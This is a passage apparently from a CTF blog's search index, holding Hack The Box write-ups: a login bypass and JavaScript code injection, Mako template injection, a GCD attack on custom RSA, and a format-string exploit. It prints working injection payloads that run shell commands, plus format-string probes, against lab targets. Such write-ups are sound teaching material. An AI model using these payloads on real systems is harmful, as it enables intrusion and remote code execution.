require('crypto'); const APP_SECRET = crypto.randomBytes(69).toString('hex'); module.exports = { sign(data) { data = Object.assign(data); return (jwt.sign(data, APP_SECRET, { algorithm:'HS256' })) }, async verify(token) { return (jwt.verify(token, APP_SECRET, { algorithm:'HS256' })); } }  It is weird to see Object.assign(data), which might recall to Prototype Pollution, but it is not exploitable.\nMoreover, there is another function at helpers/SpikyFactor.js:\nconst calculate = (activity, health, weight, happiness) =\u0026gt; { return new Promise(async (resolve, reject) =\u0026gt; { try { // devine formula :100: let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) { if (a == 'feed') { hp += 1; w += 5; hs += 3; } if (a == 'play') { w -= 5; hp += 2; hs += 3; } if (a == 'sleep') { hp += 2; w += 3; hs += 3; } if ((a == 'feed' || a == 'sleep' ) \u0026amp;\u0026amp; w \u0026gt; 70) { hp -= 10; hs -= 10; } else if ((a == 'feed' || a == 'sleep' ) \u0026amp;\u0026amp; w \u0026lt; 40) { hp += 10; hs += 5; } else if (a == 'play' \u0026amp;\u0026amp; w \u0026lt; 40) { hp -= 10; hs -= 10; } else if ( hs \u0026gt; 70 \u0026amp;\u0026amp; (hp \u0026lt; 40 || w \u0026lt; 30)) { hs -= 10; } if ( hs \u0026gt; 70 ) { m = 'kissy' } else if ( hs \u0026lt; 40 ) { m = 'cry' } else { m = 'awkward'; } if ( hs \u0026gt; 100) { hs = 100; } if ( hs \u0026lt; 5) { hs = 5; } if ( hp \u0026lt; 5) { hp = 5; } if ( hp \u0026gt; 100) { hp = 100; } if (w \u0026lt; 10) { w = 10 } return {m, hp, w, hs} }`; quickMaths = new Function(res); const {m, hp, w, hs} = quickMaths(); resolve({mood: m, health: hp, weight: w, happiness: hs}) } catch (e) { reject(e); } }); } module.exports = { calculate }  This is only accessible once we are authenticated, but we can see the vulnerability. The problem is that the variable called res contains a string that interpolates some variables that we can control. This string is used to create a JavaScript function at runtime, so we can modify a bit of the function code in order to execute a system command and read the flag.\nIn order to bypass authentication, we are going to add some console.log sentences to analyze what\u0026rsquo;s happening:\nconsole.log(req.body, username \u0026amp;\u0026amp; password)  console.log(x.sql)  This is the login page:\nAnd we can capture the request with Burp Suite:\nAnd see the output of the console.log sentences:\n{ username: 'admin', password: 'asdf' } asdf SELECT username FROM users WHERE username = 'admin' AND password = 'asdf'  Now we can test this JSON document (looking for a kind of Type Juggling vulnerability):\n{\"username\":\"admin\",\"password\":true}  { username: 'admin', password: true } true SELECT username FROM users WHERE username = 'admin' AND password = true  Next, this one:\n{\"username\":\"admin\",\"password\":1}  { username: 'admin', password: 1 } 1 SELECT username FROM users WHERE username = 'admin' AND password = 1  Another one:\n{\"username\":\"admin\",\"password\":[]}  { username: 'admin', password: [] } [] SELECT username FROM users WHERE username = 'admin' AND password =  And eventually this one:\n{\"username\":\"admin\",\"password\":[0]}  { username: 'admin', password: [ 0 ] } [ 0 ] SELECT username FROM users WHERE username = 'admin' AND password = 0  Surprisingly we have bypassed authentication and thus we are authenticated:\nNow we have this website:\nNext, we capture another request with Burp Suite:\nAnd use the following payload to inject JavaScript code and execute a system command to read the flag (adapted from a Server-Side Template Injection payload in Less.js from PayloadsAllTheThings):\n', hp=60, w=42, hs=50) { hp=global.process.mainModule.require('child_process').execSync('cat /flag.txt').toString(); return {a, hp, w, hs} //  This payload works because the JavaScript function that will be created is this one:\nwith(a='', hp=60, w=42, hs=50) { hp=global.process.mainModule.require('child_process').execSync('cat /flag.txt').toString(); return{a, hp, w, hs} //', hp=52, w=37, hs=43) {  And we get the flag locally:\nIf we perform all the steps in the remote instance, we will get the flag (HTB{s0rry_1m_n07_1nt0_typ3_ch3ck5}):\nJust as a curiosity, we can see that the authentication bypass works in MySQL querying for password = 0 despite the fact that password is of type varchar:\n$ docker exec -it d8ab08dc320a mysql Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 7 Server version: 10.6.7-MariaDB MariaDB Server Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MariaDB [(none)]\u0026gt; use spiky_tamagotchi; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MariaDB [spiky_tamagotchi]\u0026gt; select * from users where username = 'admin' and password = 0; +----+----------+------------------+ | id | username | password | +----+----------+------------------+ | 1 | admin | LrQ0SQr9kjcs0iBA | +----+----------+------------------+ 1 row in set, 1 warning (0.002 sec) MariaDB [spiky_tamagotchi]\u0026gt; exit Bye  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/spiky-tamagotchi/","section":"ctf","summary":"Authentication bypass. JavaScript code injection","time":7,"title":"Spiky Tamagotchi"},{"contents":"We are given this website:\nWe can enter some string and it will be shown in different fonts:\nStatic code analysis We are provided with the Python source code of the web application, built with Flask. This is application/blueprints/routes.py:\nfromflaskimportBlueprint, request from flask_mako importrender_template fromapplication.utilimportspookify web=Blueprint('web', __name__) @web.route('/') defindex(): text=request.args.get('text') if text: converted=spookify(text) return render_template('index.html', output=converted)  return render_template('index.html', output='')  The first thing we see here is that it is using templates, but using mako instead of the usual Jinja2 template engine.\nThe function named spookify basically uses a mapping between conventional characters and spooky fonts. However, the last transformation (font4) actually keeps the string unchanged:\ndefchange_font(text_list): text_list=[*text_list] current_font=[] all_fonts=[]  add_font_to_list=lambdatext,font_type: ( [current_font.append(globals()[font_type].get(i, ' ')) foriintext], all_fonts.append(''.join(current_font)), current_font.clear() ) andNone add_font_to_list(text_list, 'font1') add_font_to_list(text_list, 'font2') add_font_to_list(text_list, 'font3') add_font_to_list(text_list, 'font4') returnall_fonts defspookify(text): converted_fonts=change_font(text_list=text) returngenerate_render(converted_fonts=converted_fonts)  Hence, we are able to perform a Server-Side Template Injection (SSTI) attack using font4.\nExploitation In order to exploit this vulnerability, we can go to PaylaodsAllTheThings and find a payload for mako SSTI:\n${self.module.cache.util.os.system(\"id\")}  Let\u0026rsquo;s try it:\nIt only shows 0, which is the error code that os.system returns. Using os.system we will not be able to read the flag directly, but we have code execution, so we can copy the /flag.txt into a public directory:\n${self.module.cache.util.os.system(\"cp /flag.txt /app/application/static/css\")}  Flag And there we have the flag:\n$ curl 161.35.174.99:30548/static/css/flag.txt HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/web/spookifier/","section":"ctf","summary":"Server-Side Template Injection","time":2,"title":"Spookifier"},{"contents":"We are given this website:\nWe can enter some string and it will be shown in different fonts:\nStatic code analysis We are provided with the Python source code of the web application, built with Flask. This is application/blueprints/routes.py:\nfromflaskimportBlueprint, request from flask_mako importrender_template fromapplication.utilimportspookify web=Blueprint('web', __name__) @web.route('/') defindex(): text=request.args.get('text') if text: converted=spookify(text) return render_template('index.html', output=converted)  return render_template('index.html', output='')  The first thing we see here is that it is using templates, but using mako instead of the usual Jinja2 template engine.\nThe function named spookify basically uses a mapping between conventional characters and spooky fonts. However, the last transformation (font4) actually keeps the string unchanged:\ndefchange_font(text_list): text_list=[*text_list] current_font=[] all_fonts=[]  add_font_to_list=lambdatext,font_type: ( [current_font.append(globals()[font_type].get(i, ' ')) foriintext], all_fonts.append(''.join(current_font)), current_font.clear() ) andNone add_font_to_list(text_list, 'font1') add_font_to_list(text_list, 'font2') add_font_to_list(text_list, 'font3') add_font_to_list(text_list, 'font4') returnall_fonts defspookify(text): converted_fonts=change_font(text_list=text) returngenerate_render(converted_fonts=converted_fonts)  Hence, we are able to perform a Server-Side Template Injection (SSTI) attack using font4.\nExploitation In order to exploit this vulnerability, we can go to PaylaodsAllTheThings and find a payload for mako SSTI:\n${self.module.cache.util.os.system(\"id\")}  Let\u0026rsquo;s try it:\nIt only shows 0, which is the error code that os.system returns. Using os.system we will not be able to read the flag directly, but we have code execution, so we can copy the /flag.txt into a public directory:\n${self.module.cache.util.os.system(\"cp /flag.txt /app/application/static/css\")}  Flag And there we have the flag:\n$ curl 161.35.174.99:30548/static/css/flag.txt HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/spookifier/","section":"ctf","summary":"Server-Side Template Injection","time":2,"title":"Spookifier"},{"contents":"We got the Python source code used to encrypt the flag:\nfromCrypto.Util.numberimportbytes_to_long, getStrongPrime fromrandomimportrandint FLAG=b'HTB{????????????????????????????????????????????}' defkey_gen(bits): p, q=getStrongPrime(bits), getStrongPrime(bits) N=p*q returnN, (p, q) defencrypt(m, N, f): e1, e2=randint(2, N-2), randint(2, N-2) c1=(pow(f, e1, N) +m) %N c2=(pow(f, e2, N) +m) %N return(e1, c1), (e2, c2) defmain(): N, priv=key_gen(1024) m=bytes_to_long(FLAG) (e1, c1), (e2, c2) =encrypt(m, N, priv[0]) withopen('out.txt', 'w') asf: f.write(f'N = {N}\\n(e1, c1) = ({e1}, {c1})\\n(e2, c2) = ({e2}, {c2})\\n') if__name__==\"__main__\": main()  We also have the output of the script:\nN = 23252667157599516940129524769090828719982590926217686828297820221246528288024986185770032891432071416316776607472816043745785945382619303771286924656092974519197669053189283351571920071432553222222811904112119520974410020093306071010335958643236508606549664330684556056421228904824554943559829654154540793885983689462338911148618911233437943092856313175212883771802928968521215461427230178865304889974060408714941809216551397552099050566216607216463931428967751885004128977314044993037370392135272264982092147566078177173327860726953745529225163314733863792635537495622731398807790511518482833382759873192115192207209 (e1, c1) = (13130317383799359924397818711045172877651070470639872331555061566871077024416132122821689879197166729443692993224787531055068053553245916779683406195947939469930710138275745308571705318328750438377477058341710049450433868075025011970534711610887418427142999431981800104300319735079412330836192720430158369804693687507459455621592955618266507196962663247417904680299143606004651444970274693793668715761929296821908860947834841947073379537992600397854852337772316114987249254395674689638512533430273885970458183044843553777077752747556298072797820716079692849044148071698585069757021266842594074685187380985522959676924, 3276033314700994933236715546269096681595964054694634317877930652961630783669009686295177734678226788913957176667505963284895192875563765999040362544244408645923937742131293085082421535485813399270056524297324864682622089578866968706269063489779845211872503005591066652086230371845356855417702566514946373846876609725394545339840695130518357770158558391396835218039249572390662833461220605497534710914935522013573314984887838699014465554643808438475560847600079478934259045848291858470555503523718530137358192672530066755416937024529536303824075068992110042077005432280129307864841939511235555989308133055235385105960) (e2, c2) = (20883594128285008437725229014478679601366127938823960100219581029154081635436411892478004501333834114219976189312792835720670788637746570550119467812230092062199251164946197959206350494458367692847308442685450722126282132876286895613925612558140177853699821618151096670620765409968557233259334756429446973833981043722454375455334033442236036896820634662734963958738789068654435207820624411915045062084652483285735900502029367176441696762291709434815865847363600312665970290960775666366786471564595838531305478536744797611070398211876965476639913075928103807981832916853895307250848232566714169131101439494532639396872, 18023359039022070922496207692467909272905633400500071646677663883848372907925575359795644502829612958089930556811098737564701111791300315722656180784065385762079524349557515732188405944474314448560602595952205309214787356604461723684793632495397765839132359663293143446639091410994479947265462557919856471699351934094395015205994443217852376256039110600437586852484006845325143039405449700872936218023776566918818003785468900212143526790175840288515458337112681822830546618062507825380629100313042086810588864941567987823223444256356108148388871548275890051441470007397336976314029406010035567308845594636823378393001)  RSA background RSA works as follows: We take two large primes $p$ and $q$ and set the modulus $N = p \\cdot q$. Then we choose an exponent $e$ (typically $e = 65537$) and encrypt a message $m$ in decimal format:\n$$ c = m^e \\pmod{N} $$\nThe public key is the tuple $(n, e)$, and the private key is composed of the two prime numbers. To decrypt, we need to compute $\\phi(N) = (p - 1) (q - 1)$ in order to find the multiplicative inverse of $e$, which is $d = e^{-1} \\pmod{\\phi(N)}$. Then the decryption of $c$ is:\n$$ m = c^d \\pmod{N} $$\nThis works because\n$$ c = m^e \\pmod{N} \\iff c^d = (m^e)^d = m^{ed} = m \\pmod{N} $$\nFinding RSA implementation flaws This time we have an custom RSA implementation:\n$$ c_1 = p^{e_1} + m \\pmod{N} $$\n$$ c_2 = p^{e_2} + m \\pmod{N} $$\nWe already know $N$, $e_1$, $e_2$, $c_1$ and $c_2$. Moreover, $N = p \\cdot q$, where $p$ and $q$ are big prime numbers.\nNotice that\n$$ c_1 - c_2 = p^{e_1} - p_{e_2} = p \\cdot (p^{e_1 - 1} p^{e_2 - 1}) \\pmod{N} $$\nHence, $c_1 - c_2$ and $N$ share a common factor $p$. Therefore can find $p$ using the Greatest Common Divisor (GCD).\nOnce we have $p$, it is trivial to find the flag:\n$$ m = c_1 - p^{e_1} \\pmod{N} $$\nFlag All of the above computations can be done in Python. At the end, we only need to parse $m$ as bytes:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; N = 23252667157599516940129524769090828719982590926217686828297820221246528288024986185770032891432071416316776607472816043745785945382619303771286924656092974519197669053189283351571920071432553222222811904112119520974410020093306071010335958643236508606549664330684556056421228904824554943559829654154540793885983689462338911148618911233437943092856313175212883771802928968521215461427230178865304889974060408714941809216551397552099050566216607216463931428967751885004128977314044993037370392135272264982092147566078177173327860726953745529225163314733863792635537495622731398807790511518482833382759873192115192207209 \u0026gt;\u0026gt;\u0026gt; (e1, c1) = (13130317383799359924397818711045172877651070470639872331555061566871077024416132122821689879197166729443692993224787531055068053553245916779683406195947939469930710138275745308571705318328750438377477058341710049450433868075025011970534711610887418427142999431981800104300319735079412330836192720430158369804693687507459455621592955618266507196962663247417904680299143606004651444970274693793668715761929296821908860947834841947073379537992600397854852337772316114987249254395674689638512533430273885970458183044843553777077752747556298072797820716079692849044148071698585069757021266842594074685187380985522959676924, 3276033314700994933236715546269096681595964054694634317877930652961630783669009686295177734678226788913957176667505963284895192875563765999040362544244408645923937742131293085082421535485813399270056524297324864682622089578866968706269063489779845211872503005591066652086230371845356855417702566514946373846876609725394545339840695130518357770158558391396835218039249572390662833461220605497534710914935522013573314984887838699014465554643808438475560847600079478934259045848291858470555503523718530137358192672530066755416937024529536303824075068992110042077005432280129307864841939511235555989308133055235385105960) \u0026gt;\u0026gt;\u0026gt; (e2, c2) = (20883594128285008437725229014478679601366127938823960100219581029154081635436411892478004501333834114219976189312792835720670788637746570550119467812230092062199251164946197959206350494458367692847308442685450722126282132876286895613925612558140177853699821618151096670620765409968557233259334756429446973833981043722454375455334033442236036896820634662734963958738789068654435207820624411915045062084652483285735900502029367176441696762291709434815865847363600312665970290960775666366786471564595838531305478536744797611070398211876965476639913075928103807981832916853895307250848232566714169131101439494532639396872, 18023359039022070922496207692467909272905633400500071646677663883848372907925575359795644502829612958089930556811098737564701111791300315722656180784065385762079524349557515732188405944474314448560602595952205309214787356604461723684793632495397765839132359663293143446639091410994479947265462557919856471699351934094395015205994443217852376256039110600437586852484006845325143039405449700872936218023776566918818003785468900212143526790175840288515458337112681822830546618062507825380629100313042086810588864941567987823223444256356108148388871548275890051441470007397336976314029406010035567308845594636823378393001) \u0026gt;\u0026gt;\u0026gt; from math import gcd \u0026gt;\u0026gt;\u0026gt; p = gcd(c1 - c2, N) \u0026gt;\u0026gt;\u0026gt; m = c1 - pow(p, e1, N) % N \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'HTB{cu570m_83475_73x7800k_3v32y_71m3}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/spooky-rsa/","section":"ctf","summary":"RSA. Greatest Common Divisor","time":2,"title":"Spooky RSA"},{"contents":"We got the Python source code used to encrypt the flag:\nfromCrypto.Util.numberimportbytes_to_long, getStrongPrime fromrandomimportrandint FLAG=b'HTB{????????????????????????????????????????????}' defkey_gen(bits): p, q=getStrongPrime(bits), getStrongPrime(bits) N=p*q returnN, (p, q) defencrypt(m, N, f): e1, e2=randint(2, N-2), randint(2, N-2) c1=(pow(f, e1, N) +m) %N c2=(pow(f, e2, N) +m) %N return(e1, c1), (e2, c2) defmain(): N, priv=key_gen(1024) m=bytes_to_long(FLAG) (e1, c1), (e2, c2) =encrypt(m, N, priv[0]) withopen('out.txt', 'w') asf: f.write(f'N = {N}\\n(e1, c1) = ({e1}, {c1})\\n(e2, c2) = ({e2}, {c2})\\n') if__name__==\"__main__\": main()  We also have the output of the script:\nN = 25458200992030509733740123651871827168179694737564741891817013763410533831135578900317404987414083347009443171337016804117994550747038777609425522146275786823385218489896468142658492353321920860029284041857237273061376882168336089921980034356731735024837853873907395117925738744950932927683784527829300499629044776530663084875991411120648155572219472426590747952180037566734905079883718263249789131313731453855593891997376222635496337534679814697188141565730768050813250191975439504290665602928172394124501396491438097237093345376202142503439944034846839870643057174427346860377971316738504003909365471892007511334129 (e1, c1) = (22255763231110249841946619835451544743470788953822278626567823902873888725104180401047359514978597528256727783972109939326623409435352523707077685530090905587264556011558283062584063790610407522064244766804545192800000203519996147931257064951519705687708204481851413899370853107413015511963924826116255617048471033727588623329910848658324118717242497443676679226618430348230146770121025920211016222285978389380202889753020268614144716241830764562717015776308425373054119742788593926393822433887270639369774139542440755201713961244129409678232953199572105700556795757766046717275157050721726002297647024020428198870290, 19074438470072195427966520314234457847008607427606084653244579403273587717215359437848959151287968653813774451872243596539852961112790372328452176435310940366312355444995843216994547119328105950997441430508803799696108202263077660206667410037895728991246260073976495701990246589717169815787627260333746927676703415397948299928151669728670970891826725671026488571268125861689964688240713660432174319415041362820791863237794347031803574182264640071528640168842529541888996148513070006266317160300336104047046565614107490019016833308549850299600989228190163831642944507973854553499903518264459385900876967183424703346566) (e2, c2) = (23295046285127774160603234291301851851887586336491694096135804083341667982196486623010787985772884401302006627480506928365762168889259124596656609547973623161028214128429382170008181185180817200188852310143707964673736007253037970626819969310508212349854949150027746456459910448148518206090222496335254237639366458956363901115228820515207791697374943745570543635069929211464017776268424656451494147324386568859163866168248303418756480467046005765139197217754018136577337642795325944222997798231137981998354508181409469926672642302422740898720854693114056342834487668008885129303781190655860432910789997267090661459286, 17147905252678781157626731164660022679389951402035723790864177724472811805536492684462105274963820085525923148442586230016346022360533813239980197823588694113614328942373594914090007235565086360669401527248700861049825216638433673668883632064731716051799766945737234155585371938261291032941617911654796216200373195747432329591657679097825944679339369336644061159658436125778459206858632826310294115276289447751653250081978372776233383658861171699105292372718533428579168281346425439711770636421673291051002416067073005799659684303566722822458673952580001750804105442227754799536262315625088085767607467446614116889593)  RSA background RSA works as follows: We take two large primes $p$ and $q$ and set the modulus $N = p \\cdot q$. Then we choose an exponent $e$ (typically $e = 65537$) and encrypt a message $m$ in decimal format:\n$$ c = m^e \\pmod{N} $$\nThe public key is the tuple $(n, e)$, and the private key is composed of the two prime numbers. To decrypt, we need to compute $\\phi(N) = (p - 1) (q - 1)$ in order to find the multiplicative inverse of $e$, which is $d = e^{-1} \\pmod{\\phi(N)}$. Then the decryption of $c$ is:\n$$ m = c^d \\pmod{N} $$\nThis works because\n$$ c = m^e \\pmod{N} \\iff c^d = (m^e)^d = m^{ed} = m \\pmod{N} $$\nFinding RSA implementation flaws This time we have an custom RSA implementation:\n$$ c_1 = p^{e_1} + m \\pmod{N} $$\n$$ c_2 = p^{e_2} + m \\pmod{N} $$\nWe already know $N$, $e_1$, $e_2$, $c_1$ and $c_2$. Moreover, $N = p \\cdot q$, where $p$ and $q$ are big prime numbers.\nNotice that\n$$ c_1 - c_2 = p^{e_1} - p_{e_2} = p \\cdot (p^{e_1 - 1} p^{e_2 - 1}) \\pmod{N} $$\nHence, $c_1 - c_2$ and $N$ share a common factor $p$. Therefore can find $p$ using the Greatest Common Divisor (GCD).\nOnce we have $p$, it is trivial to find the flag:\n$$ m = c_1 - p^{e_1} \\pmod{N} $$\nFlag All of the above computations can be done in Python. At the end, we only need to parse $m$ as bytes:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; N = 25458200992030509733740123651871827168179694737564741891817013763410533831135578900317404987414083347009443171337016804117994550747038777609425522146275786823385218489896468142658492353321920860029284041857237273061376882168336089921980034356731735024837853873907395117925738744950932927683784527829300499629044776530663084875991411120648155572219472426590747952180037566734905079883718263249789131313731453855593891997376222635496337534679814697188141565730768050813250191975439504290665602928172394124501396491438097237093345376202142503439944034846839870643057174427346860377971316738504003909365471892007511334129 \u0026gt;\u0026gt;\u0026gt; (e1, c1) = (22255763231110249841946619835451544743470788953822278626567823902873888725104180401047359514978597528256727783972109939326623409435352523707077685530090905587264556011558283062584063790610407522064244766804545192800000203519996147931257064951519705687708204481851413899370853107413015511963924826116255617048471033727588623329910848658324118717242497443676679226618430348230146770121025920211016222285978389380202889753020268614144716241830764562717015776308425373054119742788593926393822433887270639369774139542440755201713961244129409678232953199572105700556795757766046717275157050721726002297647024020428198870290, 19074438470072195427966520314234457847008607427606084653244579403273587717215359437848959151287968653813774451872243596539852961112790372328452176435310940366312355444995843216994547119328105950997441430508803799696108202263077660206667410037895728991246260073976495701990246589717169815787627260333746927676703415397948299928151669728670970891826725671026488571268125861689964688240713660432174319415041362820791863237794347031803574182264640071528640168842529541888996148513070006266317160300336104047046565614107490019016833308549850299600989228190163831642944507973854553499903518264459385900876967183424703346566) \u0026gt;\u0026gt;\u0026gt; (e2, c2) = (23295046285127774160603234291301851851887586336491694096135804083341667982196486623010787985772884401302006627480506928365762168889259124596656609547973623161028214128429382170008181185180817200188852310143707964673736007253037970626819969310508212349854949150027746456459910448148518206090222496335254237639366458956363901115228820515207791697374943745570543635069929211464017776268424656451494147324386568859163866168248303418756480467046005765139197217754018136577337642795325944222997798231137981998354508181409469926672642302422740898720854693114056342834487668008885129303781190655860432910789997267090661459286, 17147905252678781157626731164660022679389951402035723790864177724472811805536492684462105274963820085525923148442586230016346022360533813239980197823588694113614328942373594914090007235565086360669401527248700861049825216638433673668883632064731716051799766945737234155585371938261291032941617911654796216200373195747432329591657679097825944679339369336644061159658436125778459206858632826310294115276289447751653250081978372776233383658861171699105292372718533428579168281346425439711770636421673291051002416067073005799659684303566722822458673952580001750804105442227754799536262315625088085767607467446614116889593) \u0026gt;\u0026gt;\u0026gt; from math import gcd \u0026gt;\u0026gt;\u0026gt; p = gcd(c1 - c2, N) \u0026gt;\u0026gt;\u0026gt; m = c1 - pow(p, e1, N) % N \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'HTB{5h45_w4$_sUpp0s3d_50_b3_m0r3_s3cUr3_th4n_R$4}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/other/hackthebooctf/spooky-rsa/","section":"ctf","summary":"RSA. Greatest Common Divisor","time":2,"title":"Spooky RSA"},{"contents":"We are given a 64-bit binary called spooky_time:\nArch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./glibc/'  Reverse engineering If we open the binary in Ghidra we will see this main function:\nvoidmain() { longin_FS_OFFSET; charfirst_input[12]; charsecond_input[312]; longcanary; canary =*(long*) (in_FS_OFFSET +0x28); setup(); banner(); puts(\"It\\'s your chance to scare those little kids, say something scary!\\n\"); __isoc99_scanf(\"%11s\", first_input); puts(\"\\nSeriously?? I bet you can do better than \"); printf(first_input); puts(\"\\nAnyway, here comes another bunch of kids, let\\'s try one more time..\"); puts(\"\\n\"); __isoc99_scanf(\"%299s\", second_input); puts(\"\\nOk, you are not good with that, do you think that was scary??\\n\"); printf(second_input); puts(\"Better luck next time!\\n\"); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Format String vulnerability There are two Format String vulnerabilities since we can provide two strings that will be used as first parameter for printf. The first parameter of printf is supposed to be a format string to parse subsequent parameters as integers (%d), hexadecimal values (%x), characters (%c), strings (%s)\u0026hellip;\nIf we have control of this parameter, we can dump values from the stack because we can enter formats and trick printf to think that there are a lot of parameters in printf. For example:\n$ nc 159.65.48.79 31023 You know what time it is? It's SPOOKY time! ▗▄ ▝▀▀▀ ▗▄ ▗▞▘ ▝▀▄ ▞▘ ▘▖ ▗ ▗ ▗ ▗ ▗ ▗ ▗ ▗ ▝▞ ▝▖▝ ▘ ▘ ▘ ▘ ▘ ▘ ▘ ▘ ▐ ▚ ▌ ▗▄▄ ▄▖ ▝▖ ▖ ▄▄▖ ▘ ▗▄▖ ▐ ███ ███▌ ▌ ▝ ▖▘ ▖▘ ▗▞▀ ▀▗▘ ▗ ▘ ▗ ▞ ▝▀▘ ▄▄ ▝▀▀ ▐ ▞▘ ▀▖ ▌ ▐██▌ ▐ ▞ ▝▖ ▌ ▀▀ ▐ ▖▘ ▗▞ ▐ ▌ ▐ ▝▗▘ ▚ ▝ ▌ ▐ ▐ ▄▄▖ ▄▄▖ ▝▖ ▌ ▐ ▖ ▌ ▐███ ▐██▛ ▚ ▌ ▖ ▘ ▌ ▀▀▘ ▀▀▘ ▐ ▚ ▚ ▌ ▐▖▗▌ ▝ ▐ ▝▖ ▖ ▘ ▌ ▝▌ ▝▖ ▝▖ ▌ ▌ ▌ ▝▄ ▖ ▌ ▌ ▚ ▌ ▝▌ ▌ ▐ ▄▀ ▐ ▌ ▌ ▄▄▖ ▄▝▘▘ ▀▀▀ ▌ ▗▘ ▗ ▝▄▀▘ ▝▀ ▄▄▖▀ ▐ ▐ ▐▘ ▐ ▗ ▞▘ ▞ ▗ ▖ ▝ ▛ ▌ ▝ ▝ ▖▘ ▗ ▗▝ ▚▖ ▐ ▗ ▖ ▀ ▝▀▀ ▀▘▄ ▗▄▄▖ ▌ ▗▝ ▗ ▘ ▘ ▀ ▄▄▖▝▀ ▝▘▞ It's your chance to scare those little kids, say something scary! %lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx. Seriously?? I bet you can do better than 1.1.7f775011ca37 Anyway, here comes another bunch of kids, let's try one more time.. Ok, you are not good with that, do you think that was scary?? .1.1.7f775011ca37.3f.7ffe4a82e21c.2e786c2500000000.786c252e786c25.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.2e786c252e.0.Better luck next time!  On the other hand, Format Strings vulnerabilites provide attackers the ability to write arbitrary data into arbitrary memory (write-what-where primitive) because of %n. This format works by storing the number of bytes printed up to the format string into the referenced address.\nSince our string is stored in the stack, we can control the position where we can store data. This time, we can control from position 8, let\u0026rsquo;s check it:\n$ nc 159.65.48.79 31023 You know what time it is? It's SPOOKY time! ▗▄ ▝▀▀▀ ▗▄ ▗▞▘ ▝▀▄ ▞▘ ▘▖ ▗ ▗ ▗ ▗ ▗ ▗ ▗ ▗ ▝▞ ▝▖▝ ▘ ▘ ▘ ▘ ▘ ▘ ▘ ▘ ▐ ▚ ▌ ▗▄▄ ▄▖ ▝▖ ▖ ▄▄▖ ▘ ▗▄▖ ▐ ███ ███▌ ▌ ▝ ▖▘ ▖▘ ▗▞▀ ▀▗▘ ▗ ▘ ▗ ▞ ▝▀▘ ▄▄ ▝▀▀ ▐ ▞▘ ▀▖ ▌ ▐██▌ ▐ ▞ ▝▖ ▌ ▀▀ ▐ ▖▘ ▗▞ ▐ ▌ ▐ ▝▗▘ ▚ ▝ ▌ ▐ ▐ ▄▄▖ ▄▄▖ ▝▖ ▌ ▐ ▖ ▌ ▐███ ▐██▛ ▚ ▌ ▖ ▘ ▌ ▀▀▘ ▀▀▘ ▐ ▚ ▚ ▌ ▐▖▗▌ ▝ ▐ ▝▖ ▖ ▘ ▌ ▝▌ ▝▖ ▝▖ ▌ ▌ ▌ ▝▄ ▖ ▌ ▌ ▚ ▌ ▝▌ ▌ ▐ ▄▀ ▐ ▌ ▌ ▄▄▖ ▄▝▘▘ ▀▀▀ ▌ ▗▘ ▗ ▝▄▀▘ ▝▀ ▄▄▖▀ ▐ ▐ ▐▘ ▐ ▗ ▞▘ ▞ ▗ ▖ ▝ ▛ ▌ ▝ ▝ ▖▘ ▗ ▗▝ ▚▖ ▐ ▗ ▖ ▀ ▝▀▀ ▀▘▄ ▗▄▄▖ ▌ ▗▝ ▗ ▘ ▘ ▀ ▄▄▖▝▀ ▝▘▞ It's your chance to scare those little kids, say something scary! asdf Seriously?? I bet you can do better than asdf Anyway, here comes another bunch of kids, let's try one more time.. AAAABBBB%8$lx Ok, you are not good with that, do you think that was scary?? AAAABBBB4242424241414141Better luck next time!  We entered AAAABBBB and %8$lx was replaced by 4242424241414141, which is the same in hexadecimal format, little-endian.\nFormat String exploitation Hence, we have a way to get an arbitrary write primitive. Since the binary has Partial RELRO, we can modify the entry of puts at the Global Offset Table (GOT) and set a one_gadget shell in order to get a shell.\nSince PIE and ASLR are enabled, we will need to get two memory leaks to bypass them.\nLeaking memory addresses First of all, let\u0026rsquo;s disable ASLR temporarily:\n# echo 0 | tee /proc/sys/kernel/randomize_va_space 0  Now, using a for loop and some shell scripting, we can extract stack values iterating through each position using the Format String vulnerability:\n$ for i in {1..100}; do echo -n \"$i: \"; echo \"%$i\\$lx\\n\" | ./spooky_time | tail -9 | head -1; done 1: 1 2: 1 3: 7ffff7ea7a37 4: 2a 5: 7ffff7fac280 6: 6c24362500000000 7: 78 8: 0 9: 0 10: 0 11: 0 12: 0 13: 0 14: 0 15: 0 16: 0 17: 0 18: 0 19: 0 20: 0 21: 0 22: 0 23: 0 24: 0 25: 0 26: 0 27: 0 28: 0 29: 0 30: 0 31: 0 32: 0 33: 0 34: 0 35: 0 36: 0 37: 0 38: 0 39: 0 40: 0 41: 0 42: 0 43: 0 44: 0 45: 0 46: 0 47: 591694f6743c6d00 48: 1 49: 7ffff7dbcd90 50: 0 51: 5555555553c0 52: 100000000 53: 7fffffffe7e8 54: 0 55: 47edbf377b597ad 56: 7fffffffe7e8 57: 5555555553c0 58: 555555557b80 59: 7ffff7ffd040 60: fb472429c1596cde 61: 22af37e9be135d12 62: 7fff00000000 63: 0 64: 0 65: 0 66: 0 67: e656b6af03dcc500 68: 0 